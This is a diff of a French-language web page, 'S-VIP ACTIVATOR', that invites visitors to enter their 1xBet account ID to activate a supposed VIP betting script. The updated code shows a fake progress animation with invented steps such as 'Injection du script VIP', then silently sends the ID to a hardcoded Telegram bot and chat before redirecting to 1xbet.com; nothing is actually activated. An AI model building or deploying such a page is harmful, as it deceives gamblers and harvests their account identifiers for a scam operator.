@@ -3,47 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Activation VIP - Ngeruka</title>
+    <title>S-VIP ACTIVATOR</title>
     <style>
-        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 90%; max-width: 400px; text-align: center; border: 1px solid #334155; }
-        h2 { color: #38bdf8; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: none; background: #334155; color: white; font-size: 16px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; border-radius: 8px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #0ea5e9; transform: scale(1.02); }
-        .footer { margin-top: 20px; font-size: 12px; color: #94a3b8; }
+        body { background: #0b0f19; color: #e2e8f0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { background: #161e2d; padding: 30px; border-radius: 20px; box-shadow: 0 0 30px rgba(0, 180, 255, 0.2); width: 90%; max-width: 420px; text-align: center; border: 1px solid #1e293b; }
+        .logo { font-size: 28px; font-weight: bold; color: #38bdf8; letter-spacing: 2px; margin-bottom: 10px; }
+        .status-box { background: #0f172a; border-radius: 10px; padding: 15px; margin: 20px 0; min-height: 50px; font-size: 14px; color: #94a3b8; border: 1px dashed #334155; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #334155; background: #1e293b; color: #fff; font-size: 18px; text-align: center; outline: none; transition: 0.3s; }
+        input:focus { border-color: #38bdf8; box-shadow: 0 0 10px rgba(56, 189, 248, 0.3); }
+        button { width: 100%; padding: 15px; border-radius: 10px; border: none; background: linear-gradient(135deg, #38bdf8, #1d4ed8); color: white; font-weight: bold; font-size: 16px; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        .progress-container { width: 100%; background: #334155; height: 8px; border-radius: 10px; margin: 20px 0; display: none; }
+        .progress-bar { width: 0%; height: 100%; background: #38bdf8; border-radius: 10px; transition: 0.1s; }
+        .success-msg { color: #4ade80; display: none; font-weight: bold; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>ACTIVATION VIP</h2>
-        <p>Entrez votre ID pour activer le script</p>
-        <input type="number" id="userId" placeholder="Ex: 12345678" required>
-        <button onclick="sendData()">ACTIVER MAINTENANT</button>
-        <div class="footer">© 2025 Ngeruka Service - Sécurisé</div>
+
+<div class="container" id="main-box">
+    <div class="logo">S-VIP v4.0</div>
+    <p style="font-size: 13px; color: #64748b;">Système d'activation automatique par ID</p>
+    
+    <div class="status-box" id="status">En attente d'identification...</div>
+
+    <input type="number" id="userId" placeholder="ENTREZ VOTRE ID 1XBET" required>
+    
+    <div class="progress-container" id="p-container">
+        <div class="progress-bar" id="p-bar"></div>
     </div>
 
-    <script>
-        function sendData() {
-            const id = document.getElementById('userId').value;
-            const token = "7544049875:AAFi2G_9v-nC8_1o9L9z_u6p4mD7z6k6z6k"; // Ton token
-            const chatId = "5112163453"; // Ton Chat ID
+    <button id="btn-action" onclick="startProcess()">Lancer l'activation</button>
+    <div class="success-msg" id="success">✅ ACTIVATION RÉUSSIE !</div>
+</div>
 
-            if (id.length < 5) {
-                alert("Veuillez entrer un ID valide !");
-                return;
-            }
-
-            const message = `🚀 **Nouvelle Tentative d'Activation**\n\n🆔 ID Client: \`${id}\`\n🌐 Status: En attente...`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-            fetch(url)
-                .then(response => {
-                    alert("Demande envoyée ! Activation en cours...");
-                    window.location.href = "https://1xbet.com"; // Redirection après succès
-                })
-                .catch(error => alert("Erreur de connexion."));
+<script>
+    function startProcess() {
+        const id = document.getElementById('userId').value;
+        if (id.length < 5) {
+            alert("ID invalide ou trop court.");
+            return;
         }
-    </script>
+
+        const btn = document.getElementById('btn-action');
+        const status = document.getElementById('status');
+        const pContainer = document.getElementById('p-container');
+        const pBar = document.getElementById('p-bar');
+        const userIdInput = document.getElementById('userId');
+
+        // Masquer le bouton et l'input
+        btn.style.display = "none";
+        userIdInput.style.display = "none";
+        pContainer.style.display = "block";
+
+        const steps = [
+            { t: "Vérification de l'ID dans la base...", p: 20 },
+            { t: "Connexion au serveur sécurisé...", p: 40 },
+            { t: "Calcul des algorithmes de probabilité...", p: 70 },
+            { t: "Injection du script VIP...", p: 90 },
+            { t: "Finalisation de l'activation...", p: 100 }
+        ];
+
+        let currentStep = 0;
+
+        const interval = setInterval(() => {
+            if (currentStep < steps.length) {
+                status.innerText = steps[currentStep].t;
+                pBar.style.width = steps[currentStep].p + "%";
+                currentStep++;
+            } else {
+                clearInterval(interval);
+                sendToTelegram(id);
+            }
+        }, 1500);
+    }
+
+    function sendToTelegram(id) {
+        const token = "7544049875:AAFi2G_9v-nC8_1o9L9z_u6p4mD7z6k6z6k";
+        const chatId = "5112163453";
+        const message = `🔥 **NOUVEAU COMPTE ACTIVÉ** 🔥\n\n🆔 ID: \`${id}\`\n🛡️ Statut: VIP Premium\n📡 IP: Automatique`;
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        fetch(url).then(() => {
+            document.getElementById('status').style.display = "none";
+            document.getElementById('p-container').style.display = "none";
+            document.getElementById('success').style.display = "block";
+            
+            setTimeout(() => {
+                window.location.href = "https://1xbet.com";
+            }, 2000);
+        });
+    }
+</script>
+
 </body>
 </html>
